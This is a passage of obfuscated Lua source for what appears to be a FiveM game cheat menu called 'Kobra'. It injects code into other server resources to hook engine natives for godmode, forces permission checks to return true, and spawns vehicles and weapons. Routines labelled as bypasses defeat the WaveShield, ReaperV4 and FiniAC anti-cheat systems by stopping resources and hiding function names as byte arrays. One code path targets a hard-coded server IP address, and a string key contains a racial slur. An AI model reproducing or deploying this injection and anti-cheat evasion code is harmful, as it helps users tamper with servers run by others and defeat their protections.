    ]],v221));end;v12.HandleGodmodeToggle=function(v222,v223) local v224=GetResourceState("WaveShield")=="started" ;local v225=((GetResourceState("monitor")=="started") and "monitor") or (v224 and "WaveShield") or "any" ;if v224 then local v552=897 -(525 + 372) ;while true do if (v552==(0 -0)) then if v223 then local v940=0;while true do if (v940==(0 -0)) then v12:Notify("success","Kobra","Godmode Enabled (WaveShield)",3142 -(96 + 46) );v49(v225,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else v12:Notify("error","Kobra","Godmode Disabled (WaveShield)",3000);v49(v225,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);end return;end end end if v223 then v12:Notify("success","Kobra","Godmode Enabled",3777 -(643 + 134) );MachoInjectResource2(2 + 1 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);else v12:Notify("error","Kobra","Godmode Disabled",7193 -4193 );MachoInjectResource2(11 -8 ,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);end end;v12.SpawnSelectedVehicle=function(v226,v227,v228,v229) if ( not v227 or (v227=="")) then return;end local v230=PlayerPedId();local v231=GetVehiclePedIsIn(v230,false);local v232=GetCurrentServerEndpoint();local v233=GetEntityCoords(v230);local v234=GetEntityHeading(v230);if (GetResourceState("solos-rentals")=="started") then local v553=0 + 0 ;while true do if (v553==(0 -0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",6132 -3132 );print("Creating Vehicle via Fallback #1");v553=720 -(316 + 403) ;end if (v553==(1 + 0)) then v49("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v227,tostring(v229),tostring(v228),v233.x,v233.y,v233.z,v234));break;end end elseif (GetResourceState("amigo")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",8248 -5248 );print("Creating Vehicle via Fallback #2");v49("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v227,tostring(v229),tostring(v228)));elseif v76 then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",1085 + 1915 );print("Creating Vehicle via Fallback #3");v49(v76,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v227,tostring(v229),tostring(v228)));elseif (GetResourceState("qb-core")=="started") then local v1034=0;while true do if (v1034==(2 -1)) then v49("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v227   .. [["

            if ]]   .. tostring(v229)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v228)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v233.x   .. [[, ]]   .. v233.y   .. [[, ]]   .. v233.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v234   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );break;end if (v1034==(0 + 0)) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",967 + 2033 );print("Creating Vehicle via Fallback #4");v1034=3 -2 ;end end elseif ((v232:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",3000);print("Creating Vehicle via Fallback #5");v49("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v227,tostring(v229),tostring(v228)));elseif (GetResourceState("lunar_bridge")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",14327 -11327 );print("Creating Vehicle via Fallback #6");v49("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v227,tostring(v229),tostring(v228)));elseif (GetResourceState("lation_laundering")=="started") then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",3000);print("Creating Vehicle via Fallback #7");v49("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v227,tostring(v228),tostring(v229)));else local v1302=v75();if v1302 then local v1345=0 -0 ;while true do if (v1345==1) then v49(v1302,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v227,tostring(v229),tostring(v228)));break;end if (v1345==0) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",172 + 2828 );print("Creating Vehicle via Fallback #8");v1345=1 -0 ;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then local v1440=0;local v1441;local v1442;local v1443;local v1444;local v1445;local v1446;local v1447;while true do if (v1440==0) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",147 + 2853 );if ( not v227 or (v227=="")) then return;end v1441=nil;v1440=2 -1 ;end if (v1440==(20 -(12 + 5))) then if  not v1446 then end return;end if (v1440==2) then v1444=tostring(v228);v1445=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1442,v1443,v1444);v1446,v1447=pcall(MachoInjectResourceRaw,"monitor",v1445);v1440=11 -8 ;end if (v1440==(1 -0)) then function v1441(v1575) local v1576=0 -0 ;local v1577;while true do if ((0 -0)==v1576) then v1577={};for v1649=1 + 0 , #v1575 do v1577[v1649]=string.byte(v1575,v1649);end v1576=1;end if (v1576==(1974 -(1656 + 317))) then return "{"   .. table.concat(v1577,",")   .. "}" ;end end end v1442=v1441(v227);v1443=tostring(v229);v1440=2;end end end if (GetResourceState("lb-phone")=="started") then local v1346=0 + 0 ;local v1347;local v1348;while true do if (v1346==(1 + 0)) then v1347,v1348=pcall(function() v49("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v229),v227,tostring(v228),v233.x,v233.y,v233.z,v234));end);if  not v1347 then end break;end if (v1346==0) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",7977 -4977 );print("Creating Vehicle via Fallback #10");v1346=4 -3 ;end end elseif (GetResourceState("qb-core")=="started") then local v1448=354 -(5 + 349) ;while true do if (v1448==0) then v226:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",14249 -11249 );print("Creating Vehicle via Fallback #11");v1448=1;end if (1==v1448) then v49("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v229),GetHashKey(v227),tostring(v228)));break;end end else return;end end end;local function v82() local v235=1271 -(266 + 1005) ;local v236;while true do if (v235==(1 + 0)) then return GetResourceState("ReaperV4")=="started" ;end if (v235==(0 -0)) then v236={"WaveShield","FiniAC"};for v706,v707 in ipairs(v236) do if (GetResourceState(v707)=="started") then return false;end end v235=1;end end end local function v83() local v237={"ReaperV4","WaveShield"};for v341,v342 in ipairs(v237) do if (GetResourceState(v342)=="started") then return false;end end return GetResourceState("FiniAC")=="started" ;end v12.SpawnSelectedWeapon=function(v238,v239) local v240=0;local v241;local v242;local v243;local v244;local v245;while true do if (v240==(9 -6)) then v244=GetHashKey(v239);if (v244==(1066 -(507 + 559))) then return;end v240=4;end if ((9 -5)==v240) then v245=GetResourceState("WaveShield")=="started" ;if v245 then local v767=0 -0 ;while true do if (v767==0) then v238:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",3388 -(212 + 176) );v49(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v243,v242));break;end end elseif (GetResourceState("ReaperV4")=="started") then local v941=905 -(250 + 655) ;while true do if (v941==(0 -0)) then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v941=1 -0 ;end if (3==v941) then MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v244   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );break;end if (v941==(2 -0)) then SetCurrentPedWeapon(v243,v244,true);Wait(250);v941=3;end if (v941==1) then v238:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",4956 -(1869 + 87) );GiveWeaponToPed(v243,v244,34680 -24681 ,false,true);v941=1903 -(484 + 1417) ;end end elseif (GetResourceState("FiniAC")=="started") then local v1123=0 -0 ;while true do if (v1123==(0 -0)) then v238:Notify("info","Kobra","Spawned Weapon Bypass #1",3773 -(48 + 725) );MachoResourceStop("ox_inventory");v1123=1 -0 ;end if (v1123==(2 -1)) then v49(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v242));break;end end else v238:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v49(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end

                _s()
            ]],v242));end break;end if (v240==(1 + 0)) then function v241(v708) local v709=0 -0 ;local v710;while true do if (v709==0) then v710={};for v1035=1, #v708 do v710[v1035]=string.byte(v708,v1035);end v709=1 + 0 ;end if (v709==(1 + 0)) then return table.concat(v710,",");end end end v242=v241(v239);v240=855 -(152 + 701) ;end if (v240==(1311 -(430 + 881))) then if ( not v239 or (v239=="")) then return;end v241=nil;v240=1;end if (v240==2) then v243=PlayerPedId();if ( not v243 or (v243<=(0 + 0))) then return;end v240=3;end end end;v12.GiveAllWeapons=function(v246) v49(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,[[
        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
